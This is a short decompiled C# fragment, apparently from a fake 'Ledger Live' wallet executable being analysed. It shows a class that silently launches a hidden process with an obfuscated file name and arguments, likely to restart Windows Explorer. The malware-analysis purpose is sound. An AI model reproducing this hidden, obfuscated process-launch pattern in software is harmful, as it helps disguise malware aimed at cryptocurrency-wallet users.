// Decompiled with JetBrains decompiler
// Type: �ᚁ��S�ᚹ�ΥB���.��ᚑ𐀱Δ𐬑ᚨ�קܠNܐ
// Assembly: Ledger Live, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5DC7CF87-871B-48BD-97F4-4117271260D2
// Assembly location: C:\Users\hps\Desktop\ledger\new\ledger.exe

namespace Ledger.otherUseless
{
    internal class RestartExplorer // was \uFFFD\uFFFDᚑ\uD800\uDC31Δ\uD802\uDF11ᚨ\uFFFDקܠNܐ unicode
    {
        internal void Invoke()
        {
            new ProcessStarter(new ProcessStartConfig() // was \uFFFD\uFFFDKᛇ\uFFFDDᚄHᚒ\uFFFDᚈ\uFFFD unicode, was זUΞΧᚾ\uFFFD\uFFFDC\uD802\uDF13V\uFFFD\uFFFD unicode
            {
                createNoWindow = true, // was _313
                useShellExecute = false, // was _620
                fileName = StringObfuscator.D("^*^* ^^ ^** *-*-*- * ^**^ *"), // was _376, was StringObfuscator unicode
                arguments = StringObfuscator.D("$*_+ ^*^* ~~~~0~~!! *** ^ *^ *^* ^ ~~~~0~~!! ^*^* ^^^ ^^ *^^* **^ ^ * *^* ^** * **^* *^ **^ *^** ^ *** *-*-*- * ^**^ *") // was _680, was StringObfuscator unicode
            }).Start();
        }
    }
}